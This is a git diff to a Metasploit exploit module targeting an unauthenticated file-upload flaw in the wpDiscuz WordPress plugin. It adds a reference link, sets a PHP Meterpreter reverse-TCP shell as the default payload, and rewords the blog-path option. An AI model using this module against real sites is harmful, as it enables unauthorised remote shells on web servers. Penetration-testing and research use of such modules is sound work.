@@ -28,6 +28,7 @@ class MetasploitModule < Msf::Exploit::Remote
              ['CVE','2020-1123'],
               ['WPVDB', '10333'],
               ['URL', 'https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/'],
+              ['URL','https://github.com/suncsr/wpDiscuz_unauthenticated_arbitrary_file_upload/blob/main/README.md'],
               ['URL','https://plugins.trac.wordpress.org/changeset/2345429/wpdiscuz']
             ],
           'Privileged'     => false,
@@ -35,11 +36,14 @@ class MetasploitModule < Msf::Exploit::Remote
           'Arch'           => ARCH_PHP,
           'Targets'        => [['wpDiscuz < 7.0.5', {}]],
           'DisclosureDate' => 'Feb 21 2020',
-          'DefaultTarget'  => 0)
-        )
+          'DefaultOptions' =>
+          {
+            'PAYLOAD' => 'php/meterpreter/reverse_tcp'
+          },
+          'DefaultTarget'  => 0))
 
       register_options [
-        OptString.new('BLOGPATH',[true,'Blog Path', nil]),
+        OptString.new('BLOGPATH',[true,'Link to the post [/index.php/2020/12/12/post1]', nil]),
     ]
     end
 
